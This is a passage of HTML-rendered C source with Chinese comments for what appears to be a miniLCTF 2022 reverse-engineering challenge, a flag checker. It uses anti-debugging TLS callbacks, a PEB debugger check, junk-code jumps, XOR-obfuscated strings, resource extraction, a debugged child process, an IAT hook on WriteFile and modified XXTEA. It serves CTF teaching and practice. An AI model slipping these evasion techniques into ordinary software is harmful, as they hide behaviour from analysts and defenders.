class="number">0x92</span>, <span class="number">0x11</span>, <span class="number">0xac</span> &#125;;<span class="comment">//加密flag的后20个字符的密文</span></span><br><span class="line">DWORD dwExitCode = <span class="number">0</span>;<span class="comment">//进程2的退出码，通过这个退出码进行判断flag的前半段是否正确，或者程序是否正在被调试</span></span><br><span class="line">DEBUG_EVENT debug_event = &#123; <span class="number">0</span> &#125;;<span class="comment">//用于调试器循环</span></span><br><span class="line">DWORD tls_nouse = <span class="number">0</span>;<span class="comment">//保存在自定义的TLS结构中，无用</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;<span class="comment">//TLS回调函数数组</span></span><br><span class="line">IMAGE_TLS_DIRECTORY tls = &#123; (DWORD)&amp;tls_nouse, (DWORD)&amp;tls_nouse, (DWORD)&amp;tls_nouse, (DWORD)pTLS_CALLBACKs,<span class="number">0</span>,<span class="number">0</span> &#125;;<span class="comment">//自定义的TLS结构体，后续直接修改PE文件数据目录表对应TLS的那部分即可</span></span><br><span class="line"><span class="keyword">char</span>* pbuffer;<span class="comment">//指向共享内存</span></span><br><span class="line">HANDLE hFileMap;<span class="comment">//文件映射句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//main函数其实没有被调用</span></span><br><span class="line"><span class="comment">//假的验证程序   假的flag  &quot;You_are_too_young_this_is_a_fake_flag!!!&quot;</span></span><br><span class="line"><span class="keyword">char</span> fake_enc[] = &#123; <span class="number">38</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">28</span>, <span class="number">39</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">43</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">4</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">54</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">57</span>, <span class="number">4</span>, <span class="number">59</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">61</span>, <span class="number">60</span>, <span class="number">123</span>, <span class="number">120</span>, <span class="number">121</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input your flag: &quot;</span>); </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">40</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((flag[i] ^ <span class="number">0x7F</span> ^ i) != fake_enc[i])</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">40</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;correct\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;wrong\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea_enc</span><span class="params">(DWORD* v, <span class="keyword">int</span> n, DWORD <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD y, z, sum;</span><br><span class="line"><span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>];</span><br><span class="line">z = v[p] += MX;</span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_res</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[] = &#123; <span class="number">81</span>, <span class="number">80</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">15</span>,<span class="number">0</span> &#125;; <span class="comment">//&quot;./tmp&quot;</span></span><br><span class="line"><span class="keyword">char</span> resname[] = &#123; <span class="number">58</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">45</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">0</span> &#125;; <span class="comment">//EXERES</span></span><br><span class="line"><span class="built_in">decstring</span>(name);</span><br><span class="line"><span class="built_in">decstring</span>(resname);</span><br><span class="line">HRSRC hRsrc = <span class="built_in">FindResource</span>(<span class="literal">NULL</span>, <span class="built_in">MAKEINTRESOURCEA</span>(IDR_EXERES1), <span class="built_in">TEXT</span>(resname));</span><br><span class="line">DWORD dwSize = <span class="built_in">SizeofResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line">HGLOBAL hGlobal = <span class="built_in">LoadResource</span>(<span class="literal">NULL</span>, hRsrc);</span><br><span class="line">LPVOID pBuffer = <span class="built_in">LockResource</span>(hGlobal);</span><br><span class="line"><span class="built_in">dec_res</span>((<span class="keyword">char</span> *)pBuffer, dwSize);</span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(name,</span><br><span class="line">GENERIC_WRITE | GENERIC_READ,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">CREATE_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD dwWritenSize = <span class="number">0</span>;</span><br><span class="line">BOOL bRet = ::<span class="built_in">WriteFile</span>(hFile, pBuffer, dwSize, &amp;dwWritenSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">FlushFileBuffers</span>(hFile);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">debuger_main_loop</span><span class="params">(<span class="keyword">char</span>* name, <span class="keyword">void</span>* ppi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PROCESS_INFORMATION pi = *(PROCESS_INFORMATION*)ppi;</span><br><span class="line">BOOL bRunning = TRUE;</span><br><span class="line">__asm &#123;</span><br><span class="line">call label;</span><br><span class="line">label:</span><br><span class="line">add dword ptr[esp], <span class="number">5</span>;</span><br><span class="line">ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (bRunning)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">WaitForDebugEvent</span>(&amp;debug_event, INFINITE);</span><br><span class="line"><span class="keyword">if</span> (debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) &#123;</span><br><span class="line">EXCEPTION_DEBUG_INFO exception = debug_event.u.Exception;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (exception.ExceptionRecord.ExceptionCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> STATUS_ACCESS_VIOLATION: &#123;</span><br><span class="line"><span class="comment">//print_console(&quot;addr: %#X\n&quot;, exception.ExceptionRecord.ExceptionAddress);</span></span><br><span class="line">CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">ctx.Eip += <span class="number">5</span>;</span><br><span class="line">ctx.Eax ^= <span class="number">111111</span>;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (debug_event.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)<span class="comment">//进程结束，退出调试器</span></span><br><span class="line">&#123;</span><br><span class="line">dwExitCode = debug_event.u.ExitProcess.dwExitCode;</span><br><span class="line"><span class="comment">//print_console(&quot;ExitCode : %d\n&quot;, dwExitCode);</span></span><br><span class="line">bRunning = FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_console(&quot;debug_event_code:%d,pid: %d\n&quot;, debug_event.dwDebugEventCode, debug_event.dwProcessId);</span></span><br><span class="line"><span class="built_in">ContinueDebugEvent</span>(debug_event.dwProcessId,</span><br><span class="line">debug_event.dwThreadId,</span><br><span class="line">DBG_CONTINUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">int</span> a = <span class="built_in">DeleteFile</span>(name);</span><br><span class="line"><span class="comment">//print_console(&quot;DeleteFile: %d\n&quot;, a);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD __stdcall <span class="title">MyWriteFile</span><span class="params">(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* buffer = (<span class="keyword">char</span>*)lpBuffer;</span><br><span class="line">buffer[<span class="number">0x71C</span> + <span class="number">2</span>] = <span class="number">0x6</span>;<span class="comment">//魔改xxtea 将&gt;&gt;5 改为 &gt;&gt;6</span></span><br><span class="line">buffer[<span class="number">0x6AF</span> + <span class="number">2</span>] = <span class="number">0x6</span>;</span><br><span class="line"><span class="built_in">g_dwOldFuncAddr</span>(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);</span><br><span class="line"><span class="built_in">UnIATHook</span>((DWORD)g_dwOldFuncAddr, (DWORD)MyWriteFile, hAPIModule);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetIATHook</span><span class="params">(DWORD dwOldFuncAddr, DWORD dwNewFuncAddr, HANDLE hApiModule)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);<span class="comment">//获取当前模块基址</span></span><br><span class="line"><span class="comment">//开始找导入表</span></span><br><span class="line">IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)hModule;</span><br><span class="line">IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)(pIDH-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR* pFirstIID = (IMAGE_IMPORT_DESCRIPTOR*)(pINH-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR* pTempIID = pFirstIID;<span class="comment">//找到了第一个IMAGE_IMPORT_DESCRIPTOR结构</span></span><br><span class="line"></span><br><span class="line">DWORD pOldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTempIID-&gt;FirstThunk &amp;&amp; g_dwIATHookFlag == FALSE)<span class="comment">//当没有挂钩子并且FirstThunk不为0的时候，继续遍历</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (hApiModule == <span class="built_in">GetModuleHandle</span>((<span class="keyword">char</span>*)((DWORD)hModule + pTempIID-&gt;Name)))</span><br><span class="line">&#123;</span><br><span class="line">DWORD* pTemp = (DWORD*)(pTempIID-&gt;FirstThunk + (DWORD)hModule);</span><br><span class="line"><span class="keyword">while</span> (pTemp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*pTemp == (DWORD)dwOldFuncAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pTemp, <span class="number">4</span>, PAGE_READWRITE, &amp;pOldProtect);</span><br><span class="line">*pTemp = dwNewFuncAddr;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pTemp, <span class="number">4</span>, pOldProtect, <span class="literal">NULL</span>);</span><br><span class="line">g_dwIATHookFlag = TRUE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pTemp++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pTempIID++;</span><br><span class="line"><span class="keyword">if</span> (g_dwIATHookFlag)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> g_dwIATHookFlag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnIATHook</span><span class="params">(DWORD dwOldFuncAddr, DWORD dwNewFuncAddr, HANDLE hApiModule)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);<span class="comment">//获取当前模块基址</span></span><br><span class="line">IMAGE_DOS_HEADER* pIDH = (IMAGE_DOS_HEADER*)hModule;</span><br><span class="line">IMAGE_NT_HEADERS* pINH = (IMAGE_NT_HEADERS*)(pIDH-&gt;e_lfanew + (DWORD)hModule);</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR* pFirstIID = (IMAGE_IMPORT_DESCRIPTOR*)(pINH-&gt;OptionalHeader.DataDirectory[<span class="number">1</span>].VirtualAddress + (DWORD)hModule);</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR* pTempIID = pFirstIID;<span class="comment">//找到了第一个IMAGE_IMPORT_DESCRIPTOR结构</span></span><br><span class="line"></span><br><span class="line">DWORD pOldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pTempIID-&gt;FirstThunk &amp;&amp; g_dwIATHookFlag == TRUE)<span class="comment">//当没有挂钩子并且FirstThunk不为0的时候，继续遍历</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (hApiModule == <span class="built_in">GetModuleHandle</span>((<span class="keyword">char</span>*)((DWORD)hModule + pTempIID-&gt;Name)))<span class="comment">//先找该函数所属的模块</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD* pTemp = (DWORD*)(pTempIID-&gt;FirstThunk + (DWORD)hModule);</span><br><span class="line"><span class="keyword">while</span> (pTemp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*pTemp == (DWORD)dwNewFuncAddr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pTemp, <span class="number">4</span>, PAGE_READWRITE, &amp;pOldProtect);<span class="comment">//将存储这个地址的地址的属性设置为可读可写</span></span><br><span class="line">*pTemp = dwOldFuncAddr;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(pTemp, <span class="number">4</span>, pOldProtect, <span class="literal">NULL</span>);<span class="comment">//保护模式</span></span><br><span class="line">g_dwIATHookFlag = FALSE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pTemp++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pTempIID++;</span><br><span class="line"><span class="keyword">if</span> (!g_dwIATHookFlag)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> g_dwIATHookFlag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> * <span class="title">decstring</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">&#123;</span><br><span class="line">str[i] ^= <span class="number">0x7F</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_console</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hStdout = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="built_in">WriteConsoleA</span>(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">TLS_CALLBACK1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">call label;</span><br><span class="line">label:</span><br><span class="line">add dword ptr[esp], <span class="number">30</span>;<span class="comment">//4字节</span></span><br><span class="line">ret;</span><br><span class="line">_emit <span class="number">87</span>;<span class="comment">//Welcome_to_2022_miniLCTF\0</span></span><br><span class="line">_emit <span class="number">101</span>;</span><br><span class="line">_emit <span class="number">108</span>;</span><br><span class="line">_emit <span class="number">99</span>;</span><br><span class="line">_emit <span class="number">111</span>;</span><br><span class="line">_emit <span class="number">109</span>;</span><br><span class="line">_emit <span class="number">101</span>;</span><br><span class="line">_emit <span class="number">95</span>;</span><br><span class="line">_emit <span class="number">116</span>;</span><br><span class="line">_emit <span class="number">111</span>;</span><br><span class="line">_emit <span class="number">95</span>;</span><br><span class="line">_emit <span class="number">50</span>;</span><br><span class="line">_emit <span class="number">48</span>;</span><br><span class="line">_emit <span class="number">50</span>;</span><br><span class="line">_emit <span class="number">50</span>;</span><br><span class="line">_emit <span class="number">95</span>;</span><br><span class="line">_emit <span class="number">109</span>;</span><br><span class="line">_emit <span class="number">105</span>;</span><br><span class="line">_emit <span class="number">110</span>;</span><br><span class="line">_emit <span class="number">105</span>;</span><br><span class="line">_emit <span class="number">76</span>;</span><br><span class="line">_emit <span class="number">67</span>;</span><br><span class="line">_emit <span class="number">84</span>;</span><br><span class="line">_emit <span class="number">70</span>;</span><br><span class="line">_emit <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">1</span>)<span class="comment">// DLL_PROCESS_ATTACH</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> szMsg[<span class="number">80</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">print_console</span>(szMsg);</span><br><span class="line"><span class="keyword">bool</span> dwDebugPort = <span class="number">0</span>;<span class="comment">// 监测是否是调试</span></span><br><span class="line">__asm &#123;</span><br><span class="line">mov eax, fs: [<span class="number">30</span>h]</span><br><span class="line">mov al, BYTE PTR[eax + <span class="number">2</span>]</span><br><span class="line">mov dwDebugPort, al</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!dwDebugPort)<span class="comment">// 动态注册TLS回调函数</span></span><br><span class="line">&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">call label1;</span><br><span class="line">label1:</span><br><span class="line">add dword ptr[esp], <span class="number">5</span>;<span class="comment">// 4字节</span></span><br><span class="line">ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//print_console(&quot;not debug\n&quot;);</span></span><br><span class="line">pTLS_CALLBACKs[<span class="number">1</span>] = TLS_CALLBACK2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sharememname[] = &#123; <span class="number">57</span>, <span class="number">51</span>, <span class="number">62</span>, <span class="number">56</span> ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">decstring</span>(sharememname);</span><br><span class="line">hFileMap = <span class="built_in">CreateFileMapping</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="number">0x1000</span>, sharememname);</span><br><span class="line">pbuffer = (<span class="keyword">char</span>*)<span class="built_in">MapViewOfFile</span>(hFileMap, FILE_MAP_ALL_ACCESS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0X1000</span>);</span><br><span class="line"><span class="keyword">char</span> inputFlagstr[] = &#123; <span class="number">47</span>,<span class="number">19</span>,<span class="number">26</span>,<span class="number">30</span>,<span class="number">12</span>,<span class="number">26</span>,<span class="number">95</span>,<span class="number">22</span>,<span class="number">17</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">95</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">95</span>,<span class="number">25</span>,<span class="number">19</span>,<span class="number">30</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">95</span>,<span class="number">0</span> &#125;; <span class="comment">//&quot;Please input your flag: &quot;</span></span><br><span class="line"><span class="built_in">print_console</span>(<span class="built_in">decstring</span>(inputFlagstr));</span><br><span class="line"><span class="keyword">char</span> _formatstr[] = &#123; <span class="number">90</span>, <span class="number">12</span>, <span class="number">0</span> &#125;; <span class="comment">// %s</span></span><br><span class="line"><span class="built_in">decstring</span>(_formatstr);</span><br><span class="line"><span class="built_in">scanf_s</span>(_formatstr, pbuffer, <span class="number">41</span>);<span class="comment">//限定输入最大长度是40</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">0</span>)<span class="comment">//DLL_PROCESS_DETACH</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> name[] = &#123; <span class="number">81</span>, <span class="number">80</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">15</span>,<span class="number">0</span> &#125;; <span class="comment">//&quot;./tmp&quot;</span></span><br><span class="line"><span class="built_in">decstring</span>(name);</span><br><span class="line"><span class="built_in">save_res</span>();</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line"><span class="built_in">CreateProcess</span>(</span><br><span class="line">name,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line">DEBUG_ONLY_THIS_PROCESS | DEBUG_PROCESS,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;si,</span><br><span class="line">&amp;pi</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> correct[] = &#123; <span class="number">28</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">117</span> ,<span class="number">0</span> &#125;; <span class="comment">//&quot;correct\n&quot;</span></span><br><span class="line"><span class="keyword">char</span> wrong[] = &#123; <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">24</span>, <span class="number">117</span>, <span class="number">0</span> &#125;; <span class="comment">//&quot;wrong\n&quot;</span></span><br><span class="line"><span class="keyword">char</span> checkdebugerstr[] = &#123; <span class="number">47</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">95</span>, <span class="number">28</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">95</span>, <span class="number">27</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">13</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">27</span>, <span class="number">95</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">17</span>, <span class="number">117</span>, <span class="number">0</span> &#125;;<span class="comment">// &quot;Please close the debugger and try again\n&quot;</span></span><br><span class="line"><span class="built_in">debuger_main_loop</span>(name, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (dwExitCode == <span class="number">1</span>)<span class="comment">//说明flag的第一部分是正确的</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//print_console(&quot;flag1 is correct\n&quot;);</span></span><br><span class="line"><span class="comment">//print_console(&quot;flag2: %s\n&quot;, &amp;p[20]);</span></span><br><span class="line"><span class="built_in">xxtea_enc</span>((DWORD*)&amp;pbuffer[<span class="number">20</span>], <span class="number">5</span>, xxteaKey);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">memcmp</span>(&amp;pbuffer[<span class="number">20</span>], enc_flag2, <span class="number">20</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">decstring</span>(correct);</span><br><span class="line"><span class="built_in">print_console</span>(correct);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">decstring</span>(wrong);</span><br><span class="line"><span class="built_in">print_console</span>(wrong);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwExitCode == <span class="number">-2</span>) &#123;</span><br><span class="line"><span class="built_in">decstring</span>(checkdebugerstr);</span><br><span class="line"><span class="built_in">print_console</span>(checkdebugerstr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">decstring</span>(wrong);</span><br><span class="line"><span class="built_in">print_console</span>(wrong);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*getchar();*/</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hFileMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> NTAPI <span class="title">TLS_CALLBACK2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">call label;</span><br><span class="line">label:</span><br><span class="line">add dword ptr[esp], <span class="number">5</span>;<span class="comment">//4字节</span></span><br><span class="line">ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//在这里进行HOOK操作</span></span><br><span class="line"><span class="keyword">char</span> szHookApi[] = &#123; <span class="number">40</span>, <span class="number">13</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">26</span>, <span class="number">57</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">0</span> &#125;; <span class="comment">//&quot;WriteFile&quot;</span></span><br><span class="line"><span class="keyword">char</span> szUser32[] = &#123; <span class="number">20</span>, <span class="number">26</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">81</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">0</span> &#125;; <span class="comment">//&quot;kernel32.dll&quot;</span></span><br><span class="line"><span class="comment">//模拟TLS DEBUG --&gt;HOOK</span></span><br><span class="line"><span class="built_in">decstring</span>(szHookApi);</span><br><span class="line"><span class="built_in">decstring</span>(szUser32);</span><br><span class="line">hAPIModule = <span class="built_in">GetModuleHandle</span>(szUser32);</span><br><span class="line">g_dwOldFuncAddr = (PWRITEFILE)<span class="built_in">GetProcAddress</span>(hAPIModule, szHookApi);</span><br><span class="line"><span class="built_in">SetIATHook</span>((DWORD)g_dwOldFuncAddr, (DWORD)MyWriteFile, hAPIModule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">ExitProcess</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec_res</span><span class="params">(<span class="keyword">char</span>* buffer, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span 